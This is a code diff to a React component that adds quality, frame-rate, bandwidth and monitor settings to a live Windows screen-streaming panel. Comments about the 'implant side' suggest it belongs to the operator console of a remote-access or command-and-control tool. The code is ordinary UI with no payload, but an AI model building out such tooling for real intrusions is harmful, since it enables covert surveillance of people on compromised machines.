@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef, type CSSProperties } from 'react'
-import { MonitorPlay, Play, Square, ZoomIn, ZoomOut, Maximize, Minimize } from 'lucide-react'
+import { MonitorPlay, Play, Square, ZoomIn, ZoomOut, Maximize, Minimize, Settings2 } from 'lucide-react'
 import type { Session } from '../types'
 import { sessionApi } from '../api'
 
@@ -10,7 +10,20 @@ interface ScreenStreamPanelProps {
 interface StreamFrame {
   image: string
   format: string
+  width?: number
+  height?: number
 }
+
+/** 屏幕流参数（服务端会校验并钳制；植入端按带宽预算自适应画质） */
+interface StreamParams {
+  fps: number
+  quality: number
+  max_kbps: number
+  monitor: number
+  max_width: number
+}
+
+const DEFAULT_PARAMS: StreamParams = { fps: 2, quality: 70, max_kbps: 0, monitor: 0, max_width: 0 }
 
 export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
   const [streaming, setStreaming] = useState(false)
@@ -18,6 +31,8 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
   const [error, setError] = useState('')
   const [zoom, setZoom] = useState(1)
   const [isFullscreen, setIsFullscreen] = useState(false)
+  const [params, setParams] = useState<StreamParams>(DEFAULT_PARAMS)
+  const [showParams, setShowParams] = useState(false)
   const wsRef = useRef<WebSocket | null>(null)
   const stageRef = useRef<HTMLDivElement | null>(null)
 
@@ -35,7 +50,14 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
             setError(String(event.payload.error))
             return
           }
-          setFrame({ image: event.payload.image, format: event.payload.format || 'png' })
+          // 收到正常帧时清掉上一次的错误提示（例如锁屏后解锁）
+          setError('')
+          setFrame({
+            image: event.payload.image,
+            format: event.payload.format || 'png',
+            width: event.payload.width,
+            height: event.payload.height,
+          })
         }
       } catch {
         // ignore non-JSON / malformed frames
@@ -53,7 +75,7 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
   const start = async () => {
     setError('')
     try {
-      await sessionApi.screenStream(session.id, 'start')
+      await sessionApi.screenStream(session.id, 'start', params)
       setStreaming(true)
     } catch (err: any) {
       setError(err?.response?.data?.error || err?.message || '启动失败')
@@ -130,6 +152,9 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
         <MonitorPlay size={18} color="#4f9cff" />
         <span style={{ fontWeight: 600 }}>实时屏幕流 — {session.hostname}</span>
         <div style={{ marginLeft: 'auto', display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+          <button style={iconBtn} onClick={() => setShowParams((v) => !v)} title="帧率/画质/带宽/显示器">
+            <Settings2 size={14} /> 画质参数
+          </button>
           <button className="btn-primary" onClick={start} disabled={streaming} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
             <Play size={14} /> 开始
           </button>
@@ -138,6 +163,42 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
           </button>
         </div>
       </div>
+
+      {showParams && (
+        <div style={{ display: 'flex', gap: 14, flexWrap: 'wrap', alignItems: 'flex-end', marginBottom: 12, padding: '10px 12px', border: '1px solid var(--border, #3a3a4a)', borderRadius: 6, background: 'var(--bg-elevated, #1e1e2a)', fontSize: 12 }}>
+          <label style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
+            帧率 (1-10)
+            <input type="number" min={1} max={10} value={params.fps}
+              onChange={(e) => setParams((p) => ({ ...p, fps: Number(e.target.value) || 1 }))}
+              style={{ width: 72, padding: '4px 6px' }} />
+          </label>
+          <label style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
+            JPEG 画质 (20-95)
+            <input type="number" min={20} max={95} value={params.quality}
+              onChange={(e) => setParams((p) => ({ ...p, quality: Number(e.target.value) || 70 }))}
+              style={{ width: 72, padding: '4px 6px' }} />
+          </label>
+          <label style={{ display: 'flex', flexDirection: 'column', gap: 4 }} title="0 = 不限；超限时植入端自动降画质/降帧">
+            带宽上限 KB/s
+            <input type="number" min={0} value={params.max_kbps}
+              onChange={(e) => setParams((p) => ({ ...p, max_kbps: Number(e.target.value) || 0 }))}
+              style={{ width: 90, padding: '4px 6px' }} />
+          </label>
+          <label style={{ display: 'flex', flexDirection: 'column', gap: 4 }} title="0 = 全部显示器拼接；N = 第 N 个显示器">
+            显示器
+            <input type="number" min={0} max={16} value={params.monitor}
+              onChange={(e) => setParams((p) => ({ ...p, monitor: Number(e.target.value) || 0 }))}
+              style={{ width: 72, padding: '4px 6px' }} />
+          </label>
+          <label style={{ display: 'flex', flexDirection: 'column', gap: 4 }} title="0 = 原始分辨率；如 1280 可大幅降低带宽">
+            缩放宽度
+            <input type="number" min={0} value={params.max_width}
+              onChange={(e) => setParams((p) => ({ ...p, max_width: Number(e.target.value) || 0 }))}
+              style={{ width: 90, padding: '4px 6px' }} />
+          </label>
+          <span style={{ color: 'var(--text-dim, #9a9aab)' }}>开始前设置；运行中修改需先停止再开始</span>
+        </div>
+      )}
 
       {frame && (
         <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
@@ -149,6 +210,11 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
             {isFullscreen ? '退出全屏' : '全屏'}
           </button>
           <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>{Math.round(zoom * 100)}%</span>
+          {frame.width && frame.height ? (
+            <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>
+              {frame.width}×{frame.height} {frame.format}
+            </span>
+          ) : null}
         </div>
       )}
 
@@ -164,7 +230,7 @@ export function ScreenStreamPanel({ session }: ScreenStreamPanelProps) {
         </div>
       ) : (
         <div style={placeholderStyle}>
-          {streaming ? '等待画面...' : '点击「开始」启动实时屏幕流（约 1.25 fps，Windows）'}
+          {streaming ? '等待画面...' : '点击「开始」启动实时屏幕流（Windows；帧率/画质/带宽可在「画质参数」中设置）'}
         </div>
       )}
     </div>
